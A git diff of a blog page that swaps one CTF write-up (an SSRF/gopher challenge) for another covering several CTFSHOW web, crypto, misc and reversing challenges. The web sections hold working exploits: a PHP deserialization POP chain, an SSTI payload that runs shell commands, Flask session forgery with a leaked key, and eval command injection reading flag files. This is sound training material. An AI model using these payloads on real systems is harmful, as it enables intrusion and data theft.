@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 , gopher协议 ">
-  <meta name="description" content="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园">
+  <title>CTFSHOW第三届愚人杯部分WP | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="CTFSHOW第三届愚人杯部分WP | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[TOC] MISC奇怪的压缩包下载附件后是一个压缩包，解压发现有密码，用010editor打开看看是不是伪加密。全局搜索504B，将后面的09都改为00   修改后保存就可以直接解压缩了。 解压后是一个png图片，黑不溜秋啥也没有，老规矩010editor打开看看，发现文件最后一段内容  很明显这是一个压缩包伪装成的图片文件，这个key看起来像base64，拿去解码一下：  将图片后缀修改为ra">
 <meta property="og:type" content="article">
@@ -477,9 +477,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-2023-03-15-2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CTFSHOW第三届愚人杯部分WP" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</h1>
+        <h1 class="article-title">CTFSHOW第三届愚人杯部分WP</h1>
     
     <div class="article-meta">
         
@@ -494,24 +494,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-            <a class="color4">gopher协议</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-04-02 22:18:11'>2023-04-02 19:28</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-24 19:05:02'>2023-03-15 17:45</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:589</span>
+        <span>Count:2.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -541,7 +532,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84GET%E5%92%8CPOST%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="toc-text">gopher协议的GET和POST协议格式：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">奇怪的压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-signin"><span class="toc-text">easy_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">被遗忘的反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-flask"><span class="toc-text">easy_flask</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-base"><span class="toc-text">easy_base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E7%89%9B%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">大牛的密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pyc"><span class="toc-text">easy_pyc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-cc"><span class="toc-text">easy_cc</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -557,99 +548,436 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目只有一行字：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324171848365.png" alt="image-20230324171848365"></p>
-<p>有一个传参点，试了一些路径都不行，看题目是easy_curl，尝试使用file协议读取文件：</p>
-<pre><code class="url">?url=file:///var/www/html/index.php
-?url=file:///var/www/html/flag.php
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">奇怪的压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-signin"><span class="toc-text">easy_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">被遗忘的反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-flask"><span class="toc-text">easy_flask</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-base"><span class="toc-text">easy_base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E7%89%9B%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">大牛的密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pyc"><span class="toc-text">easy_pyc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-cc"><span class="toc-text">easy_cc</span></a></li></ol></li></ol></div></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>下载附件后是一个压缩包，解压发现有密码，用<code>010editor</code>打开看看是不是伪加密。全局搜索<code>504B</code>，将后面的<code>09</code>都改为<code>00</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402194629271.png" alt="image-20230402194629271"></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402194733371.png" alt="image-20230402194733371"></p>
+<p>修改后保存就可以直接解压缩了。</p>
+<p>解压后是一个png图片，黑不溜秋啥也没有，老规矩<code>010editor</code>打开看看，发现文件最后一段内容</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402195103120.png" alt="image-20230402195103120"></p>
+<p>很明显这是一个压缩包伪装成的图片文件，这个key看起来像base64，拿去解码一下：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402195253818.png" alt="image-20230402195253818"></p>
+<p>将图片后缀修改为<code>rar</code>，用刚拿到的密码解压缩后，又有一个<code>png</code>文件，<code>010editor</code>打开查看，全局搜索<code>ctfshow</code>：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402200045673.png" alt="image-20230402200045673"></p>
+<p>找到flag</p>
+<pre><code>ctfshow&#123;Th1s_i5_f1ag&#125;
 </code></pre>
-<p>发现存在这两个文件，并读到源码：</p>
-<p><strong>index.php</strong></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>看<code>url</code>后面长得像<code>base64</code>，解码一下：</p>
+<pre><code>http://cf3e433c-0d3b-4bea-8693-33e1c27de094.challenge.ctf.show/?img=ZmFjZS5wbmc=
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402201934183.png" alt="image-20230402201934183"></p>
+<p>看来是把<code>GET</code>传入的<code>img</code>值<code>base64</code>解码后读取，传入<code>index.php</code>的base64编码值读取</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402202342033.png" alt="image-20230402202342033"></p>
+<p><code>base64</code>解码一下拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402202421559.png" alt="image-20230402202421559"></p>
+<h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>拿到源码：</p>
 <pre><code class="php">&lt;?php
+
+# 当前目录中有一个txt文件哦
 error_reporting(0);
+show_source(__FILE__);
+include(&quot;check.php&quot;);
 
-if (!isset($_REQUEST[&#39;url&#39;]))&#123;
-    header(&quot;Location: /?url=_&quot;);
-    exit;
+class EeE&#123;
+    public $text;
+    public $eeee;
+    public function __wakeup()&#123;
+        if ($this-&gt;text == &quot;aaaa&quot;)&#123;
+            echo lcfirst($this-&gt;text);
+        &#125;
+    &#125;
+
+    public function __get($kk)&#123;
+        echo &quot;$kk,eeeeeeeeeeeee&quot;;
+    &#125;
+
+    public function __clone()&#123;
+        $a = new cycycycy;
+        $a -&gt; aaa();
+    &#125;
+    
 &#125;
 
-$url=$_REQUEST[&#39;url&#39;];
-$x=parse_url($url);
-if($x[&#39;scheme&#39;]===&#39;gopher&#39;||$x[&#39;scheme&#39;]===&#39;file&#39;)&#123;
-    if(!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url))&#123;
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_exec($ch);
-        curl_close($ch);
+class cycycycy&#123;
+    public $a;
+    private $b;
+
+    public function aaa()&#123;
+        $get = $_GET[&#39;get&#39;];
+        $get = cipher($get);
+        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;
+            eval($_POST[&quot;eval&quot;]);
+        &#125;
     &#125;
-    else&#123;
-        die(&#39;hacker&#39;);
+
+
+    public function __invoke()&#123;
+        $a_a = $this -&gt; a;
+        echo &quot;\$a_a\$&quot;;
     &#125;
 &#125;
-else&#123;
-    die(&#39;are you serious？&#39;);
+
+class gBoBg&#123;
+    public $name;
+    public $file;
+    public $coos;
+    private $eeee=&quot;-_-&quot;;
+    public function __toString()&#123;
+        if(isset($this-&gt;name))&#123;
+            $a = new $this-&gt;coos($this-&gt;file);
+            echo $a;
+        &#125;else if(!isset($this -&gt; file))&#123;
+            return $this-&gt;coos-&gt;name;
+        &#125;else&#123;
+            $aa = $this-&gt;coos;
+            $bb = $this-&gt;file;
+            return $aa();
+        &#125;
+    &#125;
+&#125;   
+
+class w_wuw_w&#123;
+    public $aaa;
+    public $key;
+    public $file;
+    public function __wakeup()&#123;
+        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;
+            $this-&gt;key = file_get_contents($this -&gt; file);
+        &#125;else&#123;
+            echo &quot;不行哦&quot;;
+        &#125;
+    &#125;
+
+    public function __destruct()&#123;
+        echo $this-&gt;aaa;
+    &#125;
+
+    public function __invoke()&#123;
+        $this -&gt; aaa = clone new EeE;
+    &#125;
 &#125;
-?&gt;
+
+$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];
+unserialize($_ip);
 </code></pre>
-<p><strong>flag.php</strong></p>
+<p>先利用<code>w_wuw_w</code>中的<code>__wakeup</code>和<code>__destruct</code>读一下<code>check.php</code>的内容，由于文件内容存在<code>key</code>中，我们只能读到<code>aaa</code>，利用指针方法读到<code>key</code>地址中内容</p>
+<p>poc：</p>
 <pre><code class="php">&lt;?php
-error_reporting(0);
+class w_wuw_w&#123;
+    public $aaa;
+    public $key;
+    public $file=&quot;check.php&quot;;
+&#125;
+$a=new w_wuw_w();
+$a-&gt;aaa=&amp;$a-&gt;key;
+echo serialize($a);
+//O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;
+</code></pre>
+<p>用<code>hackbar</code>传一下</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402203339581.png" alt="image-20230402203339581"></p>
+<p>读取到<code>check.php</code>内容:</p>
+<pre><code class="php">&lt;?php
 
-$flag=getenv(&quot;DASFLAG&quot;);
-$key = md5($flag);
+function cipher($str) &#123;
 
-if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
-    echo &quot;Just View From 127.0.0.1 \n&quot;;
-    echo &quot;\n&quot;;
-    echo $key;
-    return;
+    if(strlen($str)&gt;10000)&#123;
+        exit(-1);
+    &#125;
+
+    $charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;;
+    $shift = 4;
+    $shifted = &quot;&quot;;
+
+    for ($i = 0; $i &lt; strlen($str); $i++) &#123;
+        $char = $str[$i];
+        $pos = strpos($charset, $char);
+
+        if ($pos !== false) &#123;
+            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);
+            $shifted .= $charset[$new_pos];
+        &#125; else &#123;
+            $shifted .= $char;
+        &#125;
+    &#125;
+
+    return $shifted;
+&#125;
+</code></pre>
+<p>根据代码写一个解密脚本：</p>
+<pre><code class="php">&lt;?php
+$charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;;
+$str=&quot;p8vfuv8g8v8py&quot;;
+$shifted=&quot;&quot;;
+for ($i = 0; $i &lt; strlen($str); $i++) &#123;
+    $char=$str[$i];
+    $pos = strpos($charset, $char);
+    if($pos&gt;=31)
+        $shifted.=$charset[$pos-31];
+    else
+        $shifted.=$charset[$pos+4];
+&#125;
+echo $shifted;
+//fe1ka1ele1efp
+</code></pre>
+<p>构造pop链：</p>
+<pre><code>w_wuw_w::__destruct()--&gt;gBoBg::__toString()--&gt;w_wuw_w::__invoke()--&gt;EeE::clone()--&gt;cycycycy::aaa()
+</code></pre>
+<p>payload</p>
+<pre><code class="php">&lt;?php
+
+class w_wuw_w&#123;
+    public $aaa;
+    public $key;
+    public $file=&quot;check.php&quot;;
+
+&#125;
+class gBoBg&#123;
+    public $name;
+    public $file=&quot;admin&quot;;
+    public $coos;
+&#125;
+$a=new w_wuw_w();
+$b=new gBoBg();
+$c=new w_wuw_w();
+$a-&gt;aaa=$b;
+$b-&gt;coos=$c;
+echo serialize($a);
+//O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:5:&quot;admin&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;
+</code></pre>
+<p>传参拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402204645329.png" alt="image-20230402204645329"></p>
+<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>根据题目提示<code>F12</code>拿到源码：</p>
+<pre><code class="python">from flask import Flask
+from flask import render_template_string,render_template
+app = Flask(__name__)
+
+@app.route(&#39;/hello/&#39;)
+def hello(name=None):
+    return render_template(&#39;hello.html&#39;,name=name)
+@app.route(&#39;/hello/&lt;name&gt;&#39;)
+def hellodear(name):
+    if &quot;ge&quot; in name:
+        return render_template_string(&#39;hello %s&#39; % name)
+    elif &quot;f&quot; not in name:
+        return render_template_string(&#39;hello %s&#39; % name)
+    else:
+        return &#39;Nonononon&#39;
+</code></pre>
+<p>过滤的东西很弱，随便找个payload都能打</p>
+<pre><code>http://27b20150-e164-4014-8bd9-e0eb0c01e8c4.challenge.ctf.show/hello/ge&#123;&#123;lipsum.__globals__['os'].popen('cd ..;cat f*').read()&#125;&#125;
+</code></pre>
+<p><code>/</code>不能用，这里用分号进行多次命令执行读取flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402205333768.png" alt="image-20230402205333768"></p>
+<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>打开靶机一个登录界面，正常注册登陆上去就给了题目源码：</p>
+<pre><code class="python">
+# app.py
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response
+
+
+app = Flask(__name__)
+
+
+app.secret_key = &#39;S3cr3tK3y&#39;
+
+users = &#123;
+
 &#125;
 
-if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
-    echo $flag;
-    exit;
-&#125;
-?&gt;
-</code></pre>
-<p>很明显这个题要我们利用SSRF漏洞，访问flag.php文件获得flag的MD5值，再利用gopher协议构造POST请求获取flag。</p>
-<h3 id="gopher协议的GET和POST协议格式："><a href="#gopher协议的GET和POST协议格式：" class="headerlink" title="gopher协议的GET和POST协议格式："></a>gopher协议的GET和POST协议格式：</h3><p>GET数据包只需要开头两行即可，例如：</p>
-<pre><code class="javascript">GET /test.php?a=Hello world HTTP/1.1
-Host: 127.0.0.1
-</code></pre>
-<p>POST数据包需要五行，例如：</p>
-<pre><code class="javascript">POST /test.php HTTP/1.1
-Host: 127.0.0.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 11
-Connection: close            //这个可以没有，但是没有的话连接结束会延迟一段时间
+@app.route(&#39;/&#39;)
+def index():
+# Check if user is loggedin
+if &#39;loggedin&#39; in session:
+return redirect(url_for(&#39;profile&#39;))
+return redirect(url_for(&#39;login&#39;))
 
-a=Hello world
-</code></pre>
-<p>访问flag.php获取flag的MD5值：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324180413866.png" alt="image-20230324180413866"></p>
-<pre><code class="md5">487707c46f8c478c1c0d0ee1b1a83aeb
-</code></pre>
-<p>构造POST请求：</p>
-<pre><code class="html">POST /flag.php HTTP/1.1
-Host: 127.0.0.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 36
-Connection: close
+@app.route(&#39;/login/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+msg = &#39;&#39;
+if request.method == &#39;POST&#39; and &#39;username&#39; in request.form and &#39;password&#39; in request.form:
+username = request.form[&#39;username&#39;]
+password = request.form[&#39;password&#39;]
+if username in users and password == users[username][&#39;password&#39;]:
+session[&#39;loggedin&#39;] = True
+session[&#39;username&#39;] = username
+session[&#39;role&#39;] = users[username][&#39;role&#39;]
+return redirect(url_for(&#39;profile&#39;))
+else:
+msg = &#39;Incorrect username/password!&#39;
+return render_template(&#39;login.html&#39;, msg=msg)
 
-key=487707c46f8c478c1c0d0ee1b1a83aeb
+
+@app.route(&#39;/register/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def register():
+msg = &#39;&#39;
+if request.method == &#39;POST&#39; and &#39;username&#39; in request.form and &#39;password&#39; in request.form:
+username = request.form[&#39;username&#39;]
+password = request.form[&#39;password&#39;]
+if username in users:
+msg = &#39;Account already exists!&#39;
+else:
+users[username] = &#123;&#39;password&#39;: password, &#39;role&#39;: &#39;user&#39;&#125;
+msg = &#39;You have successfully registered!&#39;
+return render_template(&#39;register.html&#39;, msg=msg)
+
+
+
+@app.route(&#39;/profile/&#39;)
+def profile():
+if &#39;loggedin&#39; in session:
+return render_template(&#39;profile2.html&#39;, username=session[&#39;username&#39;], role=session[&#39;role&#39;])
+return redirect(url_for(&#39;login&#39;))
+
+........
 </code></pre>
-<p>进行<code>url</code>二次转码，同时注意把%0a换成%0d%0a：</p>
-<pre><code class="url">POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
+<p>根据题目提示要求我们用一个<code>admin</code>账户登录才能获得关键信息，<code>secret_key</code>已经给出，直接进行<code>session</code>伪造。在<code>cookie</code>中获取<code>session</code>值，用脚本进行解密</p>
+<pre><code>python flask_session_cookie_manager3.py decode -c &quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InR0eWN
+wMyJ9.ZCl7Cw.DWToRLbEHP_dvE5IGLEsSka0bp4&quot; -s &quot;S3cr3tK3y&quot;
+解密后：
+&#123;&#39;loggedin&#39;: True, &#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;ttycp3&#39;&#125;
 </code></pre>
-<p>这里注意Content-Length的值必须正确，可以用<code>burpsuite</code>里的<code>Repeater</code>模块模拟发包一次，就会自动帮你算好Content-Length的值</p>
-<p>用gopher协议读一下：</p>
-<pre><code>index.php?url=gopher://0:80/_POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
+<p>把<code>role</code>处修改为<code>admin</code>后重新加密：</p>
+<pre><code> python flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;loggedin&#39;: True, &#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;ttycp3&#39;&#125;&quot; -s &quot;
+S3cr3tK3y&quot;
+加密后：
+eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJ0dHljcDMifQ.ZCl-5A.xOTE8Yc2N1bjeHwl0rffvZezQ2A
 </code></pre>
-<p>因为<code>.</code>和<code>127.0.0.1</code>过滤了，这里用0就可以，另外注意gopher默认打的是70端口，需要添上80端口才能正常访问到<code>flag.php</code></p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324185253479.png" alt="image-20230324185253479"></p>
-<p>拿到flag。</p>
+<p>修改session后多了一个<code>fakeflag</code>下载的地方：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402211252933.png" alt="image-20230402211252933"></p>
+<p>联想到可以任意文件下载，<code>burpsuite</code>抓包读取<code>app.py</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402211520701.png" alt="image-20230402211520701"></p>
+<p>发现hello路由下传入eval参数可以命令执行</p>
+<pre><code>http://ac3d7ab1-e4e0-44ef-9a8f-c3411458c90f.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).system(&quot;ls&quot;)
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402211759758.png" alt="image-20230402211759758"></p>
+<p>没有回显，可以写文件读取flag</p>
+<pre><code>http://9abf0a78-b014-4d42-b4af-91bfc3faef3a.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).system(&quot;cat /f*&gt;1.txt&quot;)
+</code></pre>
+<p>利用之前读文件的地方读</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402220330667.png" alt="image-20230402220330667"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><pre><code>4C455A5645334C44474A55484D5A42544F5132574956525A50464E464F4E4C474D4656454D334359474A554751564B4949493255535532464E42544643504A35
+</code></pre>
+<p>一把梭</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230402220658803.png" alt="image-20230402220658803"></p>
+<pre><code>ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;
+</code></pre>
+<h2 id="大牛的密码"><a href="#大牛的密码" class="headerlink" title="大牛的密码"></a>大牛的密码</h2><p>不解释上脚本</p>
+<pre><code class="python">from Crypto.Util.number import *
+from Crypto.Util.Padding import pad
+from random import *
+from Crypto.Util.Padding import unpad
+
+S_BOX=[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]
+c=[99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
+
+def s_box(a):
+    box=[i for i in range(a)]
+    shuffle(box)
+    return box
+BLOCK=16
+
+def swap(a,b):
+    tmp = a
+    a = b
+    b = tmp
+def encrypt1(m):
+    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]
+    for i in enc:
+        for j in range(BLOCK):
+            aa=j*7%BLOCK
+            swap(i[j],i[aa])
+def encrypt2(m):
+    for i in range(16):
+        m=[m[i] for i in S_BOX]
+    return m
+
+# Inverse of encrypt2
+def decrypt2(m):
+    for i in range(16):
+        m=[m[S_BOX.index(i)] for i in range(len(m))]
+    return m
+
+# Inverse of encrypt1
+def decrypt1(m):
+    dec=[]
+    for i in m:
+        for j in range(BLOCK-1,-1,-1):
+            aa=j*7%BLOCK
+            swap(i[j],i[aa])
+        dec+=i
+    return dec
+
+# Decrypt the ciphertext
+ciphertext = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
+ciphertext_001 = decrypt2(ciphertext)
+print(ciphertext_001)
+
+# decrypt1(ciphertext_001)
+plaintext = unpad(bytes(ciphertext_001), BLOCK)
+print(plaintext)
+</code></pre>
+<pre><code>ctfshow&#123;y0u_c5n_make_y0u1_own_CryptO&#125;
+</code></pre>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-pyc"><a href="#easy-pyc" class="headerlink" title="easy_pyc"></a>easy_pyc</h2><p>给了个pyc文件，用命令把他换成py文件</p>
+<pre><code>uncompyle6 -o ez_re.py ez_re.pyc 
+</code></pre>
+<pre><code class="python">print &#39;Welcome to CTFshow Re!&#39;
+print &#39;your flag is here!&#39;
+# flag = &#39;&#39;
+# l = len(flag)
+# for i in range(l):
+#     num = ((flag[i] + i) % 114514 + 114514) % 114514
+#     code += chr(num)
+#
+# code = map(ord, code)
+# for i in range(l - 4 + 1):
+#     code[i] = code[i] ^ code[i + 1]
+#
+# print code
+code = [&#39;\x16&#39;, &#39;\x1d&#39;, &#39;\x1e&#39;, &#39;\x1a&#39;, &#39;\x18&#39;, &#39;\t&#39;, b&#39;\xff&#39;, b&#39;\xd0&#39;, &#39;,&#39;, &#39;\x03&#39;,
+ &#39;\x02&#39;, &#39;\x14&#39;, &#39;8&#39;, &#39;m&#39;, &#39;\x01&#39;, &#39;C&#39;, &#39;D&#39;, b&#39;\xbd&#39;, b&#39;\xf7&#39;, &#39;*&#39;, &#39;\r&#39;,
+ b&#39;\xda&#39;, b&#39;\xf9&#39;, &#39;\x1c&#39;, &#39;&amp;&#39;, &#39;5&#39;, &quot;&#39;&quot;, b&#39;\xda&#39;, b&#39;\xd4&#39;, b&#39;\xd1&#39;, &#39;\x0b&#39;,
+ b&#39;\xc7&#39;, b&#39;\xc7&#39;, &#39;\x1a&#39;, b&#39;\x90&#39;, &#39;D&#39;, b&#39;\xa1&#39;]
+</code></pre>
+<p>写个脚本解一下：</p>
+<pre><code class="python">def decrypt(code):
+    code = list(map(ord, code))
+    l = len(code)
+    for i in range(l - 4, -1, -1):
+        code[i] = code[i] ^ code[i + 1]
+    for i in range(l):
+        num = ((code[i] - i) % 114514 + 114514) % 114514
+        code[i] = chr(num)
+    return &#39;&#39;.join(code)
+
+code = [&#39;\x16&#39;, &#39;\x1d&#39;, &#39;\x1e&#39;, &#39;\x1a&#39;, &#39;\x18&#39;, &#39;\t&#39;, b&#39;\xff&#39;, b&#39;\xd0&#39;, &#39;,&#39;, &#39;\x03&#39;,
+ &#39;\x02&#39;, &#39;\x14&#39;, &#39;8&#39;, &#39;m&#39;, &#39;\x01&#39;, &#39;C&#39;, &#39;D&#39;, b&#39;\xbd&#39;, b&#39;\xf7&#39;, &#39;*&#39;, &#39;\r&#39;,
